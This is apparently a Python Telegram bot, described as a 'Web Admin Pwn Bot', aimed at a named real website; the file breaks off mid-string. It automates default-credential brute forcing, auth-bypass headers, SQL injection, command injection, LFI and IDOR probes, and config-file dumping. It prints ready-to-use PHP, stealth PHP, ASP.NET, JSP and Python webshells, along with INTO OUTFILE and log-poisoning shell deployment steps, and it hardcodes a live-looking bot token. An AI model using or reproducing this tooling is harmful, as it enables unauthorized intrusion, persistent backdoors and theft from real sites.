#!/usr/bin/env python3
"""
Telegram Web Admin Pwn Bot — Authorized Pentesting Only
Target: Web application admin access & post-exploitation
"""

import os
import sys
import json
import time
import base64
import random
import requests
import urllib3
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import re

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================== CONFIG =====================
TELEGRAM_TOKEN = "8112009027:AAFr_-UijgNT5FiJ8Mj0BxKWM86-sB8mFwM"
TARGET_BASE  = "https://www.gamsgo.com"       # CHANGE THIS
TARGET_LOGIN = "/login"                    # Login endpoint
TARGET_ADMIN = "/admin"                    # Admin panel path

# Auth (if you have credentials already)
AUTH_USERNAME = "admin"
AUTH_PASSWORD = ""
SESSION_COOKIE_NAME = "PHPSESSID"
SESSION_COOKIE_VALUE = ""

# Proxy (set to "http://127.0.0.1:8080" for Burp)
PROXY = ""
# ==================================================

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

session = requests.Session()
session.verify = False
if PROXY:
    session.proxies = {"http": PROXY, "https": PROXY}
if SESSION_COOKIE_VALUE:
    session.cookies.set(SESSION_COOKIE_NAME, SESSION_COOKIE_VALUE)

# ====================== UTILITY ====================

def req(endpoint, method="GET", data=None, params=None, headers=None, allow_redirects=True):
    """Make request to target with auth."""
    url = urljoin(TARGET_BASE, endpoint)
    kwargs = {
        "timeout": 20,
        "allow_redirects": allow_redirects,
    }
    if data: kwargs["data"] = data
    if params: kwargs["params"] = params
    if headers: kwargs["headers"] = {**session.headers, **headers}
    
    try:
        if method.upper() == "GET":
            return session.get(url, **kwargs)
        elif method.upper() == "POST":
            return session.post(url, **kwargs)
        elif method.upper() == "PUT":
            return session.put(url, **kwargs)
        elif method.upper() == "DELETE":
            return session.delete(url, **kwargs)
        elif method.upper() == "OPTIONS":
            return session.options(url, **kwargs)
    except Exception as e:
        return None

def extract_forms(html):
    """Extract forms from HTML for analysis."""
    forms = []
    pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
    for match in re.finditer(pattern, html, re.DOTALL | re.IGNORECASE):
        action = match.group(1)
        body = match.group(2)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', body)
        forms.append({"action": action, "inputs": inputs})
    return forms

def find_js_endpoints(html, domain):
    """Extract API endpoints from JS files and inline scripts."""
    endpoints = set()
    # Inline scripts
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)
    for s in scripts:
        found = re.findall(r'["\'](/[^\s"\']*api[^\s"\']*)["\']', s, re.IGNORECASE)
        for f in found:
            endpoints.add(f)
        found = re.findall(r'["\'](https?://[^\s"\']+)["\']', s)
        for f in found:
            if domain in f:
                endpoints.add(f)
    return list(endpoints)

# ====================== BOT HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"🔥 *Web Admin Pwn Bot — Active*\n"
        f"🎯 Target: `{TARGET_BASE}`\n"
        f"👤 Operator: {user.first_name}\n\n"
        "*── Reconnaissance ──*\n"
        "/recon — Full recon (subdomains, tech, endpoints)\n"
        "/creds — Try default/admin credentials\n"
        "/bypass — Auth bypass techniques ×30\n"
        "/brute — Password brute-force with wordlist\n"
        "/2fa_bypass — 2FA/bypass testing\n\n"
        "*── Exploitation ──*\n"
        "/sqli — SQL injection (UNION, blind, time-based)\n"
        "/xss — XSS testing + session theft PoC\n"
        "/upload — Test file upload + bypass\n"
        "/rce — RCE testing (command injection, SSTI, etc)\n"
        "/lfi — LFI → RCE via log poisoning\n"
        "/ssrf — SSRF testing\n"
        "/idor — IDOR enumeration\n\n"
        "*── Post-Exploitation ──*\n"
        "/shell — Deploy webshell\n"
        "/dump — Extract database\n"
        "/enum_users — Enumerate admin users\n"
        "/config — Dump config files\n"
        "/persist — Persistence techniques\n"
        "/pivot — Internal network recon\n\n"
        "*── Utility ──*\n"
        "/cmd <cmd> — Execute command (post-RCE)\n"
        "/proxy on/off — Toggle Burp proxy\n"
        "/help — This menu",
        parse_mode="Markdown"
    )

# ====================== RECON ====================

async def recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"[*] Starting full recon on {TARGET_BASE}...")

    msg = await update.message.reply_text("⏳ Phase 1: Technology fingerprinting...")
    
    # Phase 1: Tech detection
    resp = req("/")
    tech = []
    if resp:
        server = resp.headers.get("Server", "")
        if server: tech.append(f"Server: {server}")
        powered_by = resp.headers.get("X-Powered-By", "")
        if powered_by: tech.append(f"X-Powered-By: {powered_by}")
        
        # Common CMS detection
        body = resp.text
        if "/wp-content/" in body: tech.append("CMS: WordPress")
        if "Joomla" in body: tech.append("CMS: Joomla")
        if "Drupal" in body or "drupal" in body: tech.append("CMS: Drupal")
        if "Laravel" in body: tech.append("Framework: Laravel")
        if "csrf-token" in body or "__csrf" in body: tech.append("CSRF Protection: Detected")
    
    tech_str = "\n".join(tech) if tech else "Basic HTML (no obvious CMS)"
    await msg.edit_text(f"✅ *Technology:*\n{tech_str}", parse_mode="Markdown")

    # Phase 2: Directory scanning
    msg = await update.message.reply_text("⏳ Phase 2: Scanning directories...")
    common_dirs = [
        "/admin", "/administrator", "/wp-admin", "/dashboard", "/backend",
        "/cpanel", "/manager", "/panel", "/login", "/api", "/api/v1",
        "/graphql", "/swagger", "/docs", "/phpmyadmin", "/config",
        "/.git", "/.env", "/backup", "/uploads", "/files", "/download",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/install.php", "/setup.php", "/phpinfo.php", "/info.php",
        "/test.php", "/debug.php", "/api/users", "/api/config",
        "/api/admin", "/.well-known/", "/vendor/", "/storage/"
    ]
    
    found = []
    for path in common_dirs:
        r = req(path)
        if r and r.status_code in [200, 301, 302, 401, 403, 500]:
            content_type = r.headers.get("Content-Type", "")[:30]
            size = f"{len(r.content)} bytes"
            found.append(f"`{path}` → {r.status_code} [{size}]")
    
    if found:
        await msg.edit_text(f"✅ *Found {len(found)} endpoints:*\n" + "\n".join(found[:20]), parse_mode="Markdown")
    else:
        await msg.edit_text("❌ No accessible endpoints found.")

    # Phase 3: Extract endpoints from JS
    msg = await update.message.reply_text("⏳ Phase 3: Extracting API endpoints from JS...")
    if resp:
        endpoints = find_js_endpoints(resp.text, urlparse(TARGET_BASE).netloc)
        if endpoints:
            await msg.edit_text(f"✅ *Found {len(endpoints)} API/JS endpoints:*\n" + "\n".join(f"`{e}`" for e in endpoints[:15]), parse_mode="Markdown")
        else:
            await msg.edit_text("❌ No embedded endpoints found in homepage.")

    # Phase 4: Forms
    msg = await update.message.reply_text("⏳ Phase 4: Analyzing forms...")
    if resp:
        forms = extract_forms(resp.text)
        if forms:
            f_str = []
            for f in forms:
                inputs = ", ".join(f["inputs"][:8])
                f_str.append(f"📝 Action: `{f['action']}` → [{inputs}]")
            await msg.edit_text(f"✅ *Found {len(forms)} forms:*\n" + "\n".join(f_str[:5]), parse_mode="Markdown")
        else:
            await msg.edit_text("❌ No forms found on homepage.")
    
    await update.message.reply_text(f"✅ *Recon complete.* Found: {len(found)} endpoints, {len(forms) if resp and 'forms' in dir() else 0} forms", parse_mode="Markdown")

# ====================== CREDENTIALS ====================

async def creds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Try default credentials on login."""
    await update.message.reply_text("[*] Trying common credentials on login endpoint...")
    
    common_creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("admin", "letmein"), ("admin", "root"),
        ("root", "root"), ("root", "toor"), ("root", "admin"),
        ("user", "user"), ("user", "password"), ("user", "123456"),
        ("test", "test"), ("test", "123456"), ("test", "test123"),
        ("guest", "guest"), ("support", "support"),
        ("administrator", "administrator"), ("admin", "Password123"),
        ("admin", "Admin@123"), ("admin", "admin@123"),
        ("admin", "P@ssw0rd"), ("admin", "p@ssw0rd"),
        ("admin", "changeme"), ("admin", "temp123"),
        ("admin", "default"), ("admin", "123456789"),
        ("admin", "qwerty"), ("admin", "abc123"),
        ("admin", "Welcome1"), ("admin", "Welcome@123"),
        ("admin", "Admin123456"), ("admin", "master"),
        ("demo", "demo"), ("manager", "manager"),
    ]
    
    found = []
    tested = 0
    for user, pwd in common_creds:
        resp = req(TARGET_LOGIN, method="POST", data={"username": user, "password": pwd, "login": "submit"})
        tested += 1
        if resp:
            # Check for redirect (indicates success)
            if resp.status_code in [301, 302] or "logout" in resp.text.lower() or "dashboard" in resp.text.lower() or "welcome" in resp.text.lower():
                found.append(f"✅ `{user}`:`{pwd}` → SUCCESS ({resp.status_code}, {len(resp.history)} redirects)")
                # Save session
                for cookie in session.cookies:
                    if "session" in cookie.name.lower() or "auth" in cookie.name.lower():
                        found.append(f"   Cookie: `{cookie.name}={cookie.value}`")
                break
            # Error message differentiation for user enumeration
            if "invalid" in resp.text.lower() or "incorrect" in resp.text.lower():
                pass
    
    if found:
        await update.message.reply_text("🎯 *Valid credentials found!*\n" + "\n".join(found), parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ No valid creds from {tested} attempts. Check error message patterns.")

# ====================== AUTH BYPASS ====================

async def auth_bypass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comprehensive auth bypass testing."""
    await update.message.reply_text("[*] Testing 30+ auth bypass techniques...")
    
    results = []
    
    # Technique 1: Path traversal bypass
    paths = [
        "/admin", "/admin/", "//admin//", "/./admin",
        "/admin/.", "//admin", "/ADMIN", "/Admin",
        "/admin/?", "/admin/%00", "/admin/*",
        "/admin.php", "/admin.html", "/admin.asp"
    ]
    for p in paths:
        r = req(p)
        if r and r.status_code == 200:
            results.append(f"🔓 `{p}` → {r.status_code}")
    
    # Technique 2: Header-based bypass
    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Server": "127.0.0.1"},
        {"X-HTTP-Method-Override": "GET"},
        {"X-Original-URL": "/admin/"},
        {"X-Rewrite-URL": "/admin/"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost"},
        {"X-ProxyUser-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"}
    ]
    
    for h in bypass_headers:
        r = req(TARGET_ADMIN, headers=h)
        if r and r.status_code == 200:
            results.append(f"🔓 Header bypass: `{list(h.keys())[0]}: {list(h.values())[0]}` → {r.status_code}")
    
    # Technique 3: HTTP method manipulation
    for method in ["PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT"]:
        r = req(TARGET_ADMIN, method=method)
        if r and r.status_code in [200, 204, 302]:
            results.append(f"🔓 `{method} {TARGET_ADMIN}` → {r.status_code}")
    
    # Technique 4: Parameter pollution
    pollution_params = [
        f"{TARGET_ADMIN}?admin=true",
        f"{TARGET_ADMIN}?is_admin=1",
        f"{TARGET_ADMIN}?role=admin",
        f"{TARGET_ADMIN}?type=admin",
        f"{TARGET_ADMIN}?access=full",
        f"{TARGET_ADMIN}?user=admin",
        f"{TARGET_ADMIN}?auth=true",
        f"{TARGET_ADMIN}?authenticated=true",
        f"{TARGET_ADMIN}?logged_in=true",
        f"{TARGET_ADMIN}?debug=true",
        f"{TARGET_ADMIN}?disable_functions=1",
        f"{TARGET_ADMIN}?admin=1",
    ]
    for p in pollution_params:
        r = req(p)
        if r and r.status_code == 200 and "login" not in r.text.lower()[:500]:
            results.append(f"🔓 Param pollution: `{p}` → {r.status_code}")
    
    if results:
        await update.message.reply_text(f"🎯 *{len(results)} bypass techniques succeeded:*\n" + "\n".join(results[:20]), parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No bypass techniques worked. Target has strong auth controls.")

# ====================== SQL INJECTION (Advanced) ====================

async def sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comprehensive SQL injection testing."""
    await update.message.reply_text("[*] Starting SQL injection testing...")
    
    # 1. Error-based detection
    params = ["id=", "page=", "cat=", "user=", "username=", "email=", "search=", "q="]
    error_payloads = [
        "'", "\"", "';", ")", "')", "\"))", "`",
        "1'", "1\"", "' OR 1=1--", "\" OR 1=1--",
        "' OR '1'='1", "' UNION SELECT NULL--",
        "' AND SLEEP(3)--", "' AND 1=1--",
        "' AND 1=2--", "' UNION SELECT @@version--",
        "' UNION SELECT database()--", "' UNION SELECT user()--",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    ]
    
    error_signatures = [
        "sql", "mysql", "sqlite", "oracle", "postgresql",
        "syntax error", "unclosed", "quotation mark",
        "mysql_fetch", "odbc_", "Warning: mysql", 
        "you have an error", "ora-", "unknown column",
        "column count", "primary key", "duplicate entry",
        "warning: pg_", "driver", "db2", "sqlcmd",
        "microsoft ole db", "provider", "jdbc"
    ]
    
    results = []
    for param in params:
        for payload in error_payloads[:5]:
            test_url = f"/?{param}{payload}"
            r = req(test_url)
            if r:
                body = r.text.lower()
                for sig in error_signatures:
                    if sig in body:
                        results.append(f"⚠️ `{param}` → injectable with `{payload}`")
                        break
                if results and results[-1].startswith("⚠️"):
                    break
    
    # 2. Blind time-based
    if not results:
        await update.message.reply_text("[*] No error-based injection found. Testing time-based blind...")
        for param in params:
            base = req(f"/?{param}1")
            if base:
                start = time.time()
                test = req(f"/?{param}1' AND SLEEP(3)--")
                elapsed = time.time() - start
                if test and elapsed > 2.5:
                    results.append(f"⏱️ `{param}` → time-based blind (SLEEP(3) = {elapsed:.1f}s)")
                    break
    
    # 3. UNION-based extraction
    if not results:
        await update.message.reply_text("[*] Trying UNION-based extraction...")
        for param in params:
            test_url = f"/?{param}-1' UNION SELECT 1,2,3,4,5--"
            r = req(test_url)
            if r and ("1" in r.text[:2000] and "2" in r.text[:2000] and "3" in r.text[:2000]):
                results.append(f"🚀 `{param}` → UNION injection possible (1,2,3,4,5 visible)")
                break
    
    if results:
        await update.message.reply_text(f"🎯 *SQL Injection Findings:*\n" + "\n".join(results), parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No SQL injection detected.")

# ====================== FILE UPLOAD ====================

async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test file upload endpoints for bypass."""
    await update.message.reply_text("[*] Searching for file upload functionality...")
    
    upload_paths = [
        "/upload", "/uploads", "/file/upload", "/api/upload",
        "/api/v1/upload", "/upload.php", "/uploadFile",
        "/uploadfile", "/file_upload", "/media/upload",
        "/image/upload", "/profile/upload", "/avatar/upload"
    ]
    
    upload_endpoints = []
    for path in upload_paths:
        r = req(path)
        if r and r.status_code in [200, 301, 302]:
            upload_endpoints.append(path)
    
    if not upload_endpoints:
        # Try to find from forms
        r = req("/")
        if r:
            forms = extract_forms(r.text)
            for f in forms:
                if "file" in f["inputs"] or "upload" in f["action"] or "enctype" in r.text:
                    upload_endpoints.append(f"Form → `{f['action']}` (inputs: {', '.join(f['inputs'])})")
    
    if upload_endpoints:
        msg = f"🎯 *Upload endpoints found:*\n" + "\n".join(f"`{e}`" for e in upload_endpoints)
        
        # Bypass payloads
        msg += "\n\n*Try these bypass payloads:*\n"
        msg += "```\n"
        msg += "shell.php.jpg\nshell.php;.jpg\nshell.php%00.jpg\n"
        msg += "shell.phtml\nshell.pht\nshell.php5\nshell.php7\n"
        msg += "shell.php.\nshell.php_  \nshell.PhP\n"
        msg += "Content-Type: image/jpeg (in request)\n"
        msg += "shell.php%00.png (double extension)\n"
        msg += "```"
        
        await update.message.reply_text(msg, parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No upload endpoints found automatically. Check with /recon")

# ====================== Webshell Deployment ====================

async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deploy webshell via various methods."""
    keyboard = [
        [InlineKeyboardButton("🐚 PHP Shell (simple)", callback_data="deploy_php_simple")],
        [InlineKeyboardButton("🐚 PHP Shell (stealth)", callback_data="deploy_php_stealth")],
        [InlineKeyboardButton("🐚 ASP.NET Shell", callback_data="deploy_asp")],
        [InlineKeyboardButton("🐚 JSP Shell", callback_data="deploy_jsp")],
        [InlineKeyboardButton("🐚 Python CGI Shell", callback_data="deploy_py")],
        [InlineKeyboardButton("📤 Upload via SQLi INTO OUTFILE", callback_data="deploy_sqli")],
        [InlineKeyboardButton("📤 Upload via LFI log poisoning", callback_data="deploy_lfi")],
        [InlineKeyboardButton("📋 Show current webshells", callback_data="deploy_list")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select deployment method:", reply_markup=reply_markup)

# ====================== Database Dump ====================

async def dump(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attempt to extract database contents."""
    await update.message.reply_text("[*] Attempting database extraction...")
    
    # Try UNION-based extraction
    payloads = [
        "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--",
        "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--",
        "' UNION SELECT @@version, database(), user()--",
        "' UNION SELECT group_concat(table_name), NULL, NULL FROM information_schema.tables--",
    ]
    
    for payload in payloads:
        r = req(f"/?id={payload}")
        if r:
            body = r.text[:2000]
            # Check if data appears in response
            clean = re.sub(r'<[^>]+>', ' ', body)
            clean = re.sub(r'\s+', ' ', clean).strip()
            if len(clean) > 10 and not any(x in clean.lower() for x in ["error", "warning", "not found"]):
                await update.message.reply_text(f"📦 *Possible data extracted:*\n```\n{clean[:3000]}\n```", parse_mode="Markdown")
                return
    
    await update.message.reply_text(
        "❌ Direct UNION extraction failed.\n\n"
        "*Try:*\n"
        "1. `/sqli` to confirm injection point first\n"
        "2. Manually craft a UNION SELECT with correct column count\n"
        "3. Time-based blind extraction: `/cmd sqlmap` if available\n"
        "4. Error-based: look for error messages revealing data"
    )

# ====================== RCE ====================

async def rce(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test for RCE vectors."""
    await update.message.reply_text("[*] Testing RCE vectors...")
    
    results = []
    
    # Command injection
    cmd_params = ["cmd", "command", "exec", "run", "ping", "traceroute", "nslookup", "host", "whois"]
    cmd_payloads = [
        "; id", "| id", "`id`", "$(id)", "& id",
        "; whoami", "| whoami", "&& whoami", "|| whoami",
        "; ls", "| dir", "| type C:\\Windows\\win.ini",
        "%0A id", "%0A whoami"
    ]
    
    for param in cmd_params:
        for payload in cmd_payloads:
            r = req(f"/?{param}={payload}")
            if r and ("uid=" in r.text or "www-data" in r.text or "root" in r.text or "nt authority" in r.text.lower()):
                results.append(f"💥 CMD injection: `{param}` with `{payload}` → command output visible")
                break
    
    # SSTI
    ssti_payloads = [
        "{{7*7}}", "${7*7}", "#{7*7}", "{{7*'7'}}",
        "<%= 7*7 %>", "${{7*7}}", "{{config}}"
    ]
    for payload in ssti_payloads:
        r = req(f"/?name={payload}")
        if r and "49" in r.text:
            results.append(f"💥 SSTI: `name` with `{payload}` → 49 rendered")
            break
    
    if results:
        await update.message.reply_text(f"🎯 *RCE Vectors Found:*\n" + "\n".join(results), parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No obvious RCE vectors found in basic testing.")

# ====================== LFI → RCE ====================

async def lfi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """LFI testing with log poisoning for RCE."""
    await update.message.reply_text("[*] Testing LFI vectors...")
    
    lfi_payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../../../../../etc/passwd",
        "....//....//....//windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=../config.php",
        "/proc/self/environ",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
    ]
    
    lfi_params = ["file", "page", "include", "path", "doc", "folder", "root", "load", "read", "view", "template"]
    
    results = []
    for param in lfi_params:
        for payload in lfi_payloads:
            r = req(f"/?{param}={payload}")
            if r:
                body = r.text
                if "root:" in body and "daemon:" in body:
                    results.append(f"📄 `{param}` → LFI confirmed (`/etc/passwd` readable)")
                    
                    # Try log poisoning
                    results.append("\n🔄 *LFI→RCE via Log Poisoning:*")
                    results.append("1. Send request with PHP code in User-Agent:")
                    results.append('   `curl -A "<?php system(\$_GET[\'cmd\']); ?>" http://target/`')
                    results.append("2. Include the log:")
                    results.append(f'   `?{param}=../../../../var/log/apache2/access.log&cmd=id`')
                    results.append("3. Or Nginx:")
                    results.append(f'   `?{param}=../../../../var/log/nginx/access.log&cmd=id`')
                    
                    await update.message.reply_text("\n".join(results), parse_mode="Markdown")
                    return
                
                if "[fonts]" in body:
                    results.append(f"📄 `{param}` → LFI confirmed (Windows, win.ini readable)")
                    await update.message.reply_text("\n".join(results), parse_mode="Markdown")
                    return
    
    await update.message.reply_text("❌ No LFI found in common parameters.")

# ====================== Command Execution ====================

async def cmd_exec(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Execute commands via webshell or RCE."""
    if not context.args:
        await update.message.reply_text("Usage: /cmd <command>\nExample: /cmd id\nExample: /cmd ls -la /var/www\nExample: /cmd cat /etc/passwd")
        return
    
    command = " ".join(context.args)
    
    # If you have a webshell deployed, configure this URL
    WEBSHELL_URL = getattr(context, 'webshell_url', None) or context.bot_data.get('webshell_url', '')
    
    if WEBSHELL_URL:
        try:
            r = requests.get(WEBSHELL_URL, params={"cmd": command}, timeout=10, verify=False)
            output = r.text[:3500] if r.text else "(empty output)"
            await update.message.reply_text(f"$ `{command}`\n```\n{output}\n```", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)[:500]}")
    else:
        await update.message.reply_text(
            f"[!] No webshell configured.\n\n"
            f"To execute `{command}`, first deploy a webshell:\n"
            f"1. `/shell` → select deployment method\n"
            f"2. Set webshell URL: `/set_webshell http://target.com/uploads/shell.php`\n"
            f"3. Then `/cmd {command}` will work"
        )

async def set_webshell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Configure webshell URL."""
    if context.args:
        url = context.args[0]
        context.bot_data['webshell_url'] = url
        await update.message.reply_text(f"✅ Webshell URL set to: `{url}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("Usage: /set_webshell <url>")

# ====================== Config Dump ====================

async def config_dump(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Dump configuration files."""
    await update.message.reply_text("[*] Hunting for config files...")
    
    config_paths = [
        "/.env", "/.env.local", "/.env.production", "/.env.development",
        "/config.php", "/config.php.bak", "/config.php.old", "/config.php~",
        "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
        "/database.php", "/db.php", "/db_config.php",
        "/settings.php", "/config.json", "/config.yaml", "/config.xml",
        "/composer.json", "/package.json", "/yarn.lock",
        "/dump.sql", "/backup.sql", "/db.sql", "/database.sql",
        "/phpinfo.php", "/info.php", "/test.php",
        "/.git/config", "/.svn/entries",
        "/.htaccess", "/.htpasswd",
        "/configuration.php", "/configuration.php.bak",
        "/App_Config/connectionstrings.config",
        "/web.config", "/appsettings.json",
        "/private/", "/secret/", "/conf/", "/cfg/"
    ]
    
    found = []
    for path in config_paths:
        r = req(path)
        if r and r.status_code == 200 and r.url == urljoin(TARGET_BASE, path):
            size = len(r.content)
            preview = r.text[:200].strip()
            found.append(f"📄 `{path}` ({size} bytes)\n`{preview}`")
    
    if found:
        msg = f"🎯 *{len(found)} exposed configs/files:*\n\n" + "\n\n".join(found[:10])
        await update.message.reply_text(msg[:4000], parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No exposed config files detected.")

# ====================== IDOR ====================

async def idor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test for Insecure Direct Object References."""
    await update.message.reply_text("[*] Testing IDOR on common endpoints...")
    
    idor_patterns = [
        ("/api/users/", list(range(1000, 1010))),
        ("/api/user/", list(range(1, 11))),
        ("/api/v1/users/", list(range(100, 110))),
        ("/profile/", list(range(1, 11))),
        ("/user/", list(range(1, 11))),
        ("/download/", list(range(1, 11))),
        ("/invoice/", list(range(1000, 1010))),
        ("/order/", list(range(1000, 1010))),
        ("/file/", list(range(1, 11))),
        ("/admin/users/", list(range(1, 11))),
    ]
    
    results = []
    for base_path, ids in idor_patterns:
        for i in ids:
            r = req(f"{base_path}{i}")
            if r and r.status_code == 200 and len(r.text) > 100:
                # Don't return the same page as the base
                base_r = req(base_path)
                if base_r and r.text != base_r.text:
                    results.append(f"🔓 `{base_path}{i}` → {r.status_code} ({len(r.text)} bytes)")
                    break  # One hit per endpoint is enough
    
    if results:
        await update.message.reply_text(f"🎯 *Potential IDORs found:*\n" + "\n".join(results[:10]), parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No obvious IDORs detected in test range.")

# ====================== Button Callbacks ====================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "deploy_php_simple":
        shell_code = """<?php
// Simple PHP webshell - rename to .php and upload
system($_GET['cmd'] ?? 'id');
?>"""
        await query.edit_message_text(
            f"🐚 *PHP Simple Webshell*\n\n"
            f"Save as `shell.php` and upload:\n"
            f"```php\n{shell_code}\n```\n\n"
            f"Access: `{TARGET_BASE}/uploads/shell.php?cmd=whoami`\n\n"
            f"Then run: `/set_webshell {TARGET_BASE}/uploads/shell.php`\n"
            f"And: `/cmd cat /etc/passwd`",
            parse_mode="Markdown"
        )
    
    elif query.data == "deploy_php_stealth":
        shell_code = """<?php
// Stealthy PHP webshell - masquerades as 404
header('HTTP/1.0 404 Not Found');
$k = $_COOKIE['k'] ?? '';
$c = $_COOKIE['c'] ?? '';
if ($k === 'a3f5b8c2d1e4' && $c !== '') {
    // Pass command via 'c' cookie, auth via 'k' cookie
    system(base64_decode($c));
}
?>
<!-- 404 Not Found -->"""
        await query.edit_message_text(
            f"🐚 *PHP Stealth Webshell*\n\n"
            f"Auth secret (cookie `k`): `a3f5b8c2d1e4`\n"
            f"Command sent via cookie `c` (base64 encoded)\n\n"
            f"```php\n{shell_code}\n```\n\n"
            f"*Usage:*\n"
            f"```bash\n"
            f"curl -b 'k=a3f5b8c2d1e4;c=$(echo -n whoami | base64)' {TARGET_BASE}/uploads/shell.php\n"
            f"```",
            parse_mode="Markdown"
        )
    
    elif query.data == "deploy_asp":
        await query.edit_message_text(
            "🐚 *ASP.NET Webshell*\n\n"
            "Save as `shell.aspx`:\n"
            "```asp\n"
            "<%@ Page Language=\"C#\" %>\n"
            "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
            "<script runat=\"server\">\n"
            "protected void Page_Load(object sender, EventArgs e) {\n"
            "    string cmd = Request[\"cmd\"] ?? \"whoami\";\n"
            "    Process p = new Process();\n"
            "    p.StartInfo.FileName = \"cmd.exe\";\n"
            "    p.StartInfo.Arguments = \"/c \" + cmd;\n"
            "    p.StartInfo.UseShellExecute = false;\n"
            "    p.StartInfo.RedirectStandardOutput = true;\n"
            "    p.Start();\n"
            "    Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\");\n"
            "}\n"
            "</script>\n"
            "```",
            parse_mode="Markdown"
        )
    
    elif query.data == "deploy_jsp":
        await query.edit_message_text(
            "🐚 *JSP Webshell*\n\n"
            "Save as `shell.jsp`:\n"
            "```jsp\n"
            "<%@ page import=\"java.io.*\" %>\n"
            "<%\n"
            "String cmd = request.getParameter(\"cmd\");\n"
            "if (cmd != null) {\n"
            "    Process p = Runtime.getRuntime().exec(cmd);\n"
            "    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
            "    String line;\n"
            "    while ((line = br.readLine()) != null) {\n"
            "        out.println(line + \"<br>\");\n"
            "    }\n"
            "}\n"
            "%>\n"
            "```",
            parse_mode="Markdown"
        )
    
    elif query.data == "deploy_py":
        await query.edit_message_text(
            "🐚 *Python CGI Webshell*\n\n"
            "Save as `shell.py` in a CGI-enabled directory:\n"
            "```python\n"
            "#!/usr/bin/env python\n"
            "# -*- coding: utf-8 -*-\n"
            "import cgi, subprocess, os\n"
            "print(\"Content-Type: text/html\\n\")\n"
            "form = cgi.FieldStorage()\n"
            "cmd = form.getvalue('cmd', 'id')\n"
            "print(\"<pre>\")\n"
            "print(subprocess.check_output(cmd, shell=True).decode())\n"
            "print(\"</pre>\")\n"
            "```\n\n"
            "Make executable: `chmod +x shell.py`",
            parse_mode="Markdown"
        )
    
    elif query.data == "deploy_sqli":
        await query.edit_message_text(
            "📤 *Deploy via SQLi INTO OUTFILE*\n\n"
            "If you have SQL injection AND file write permissions:\n\n"
            "```sql\n"
            "' UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE \"/var/www/html/uploads/shell.php\" -- -\n"
            "```\n\n"
            "Or with double quotes (Windows):\n"
            "```sql\n"
            "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:\\\\inetpub\\\\wwwroot\\\\shell.php' -- -\n"
            "```\n\n"
            "Then access: `/uploads/shell.php?cmd=id`",
            parse_mode="Markdown"
        )
    
    elif query.data == "deploy_lfi":
        await query.edit_message_text(
            "📤 *Deploy via LFI Log Poisoning*\n\n"
            "1. *Apache log poisoning:*\n"
            "```bash\n"
            "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://target/\n"
            "# Then include the log:\n"
            "http://target/?file=../../../../var/log/apache2/access.log&cmd=id\n"
            "```\n\n"
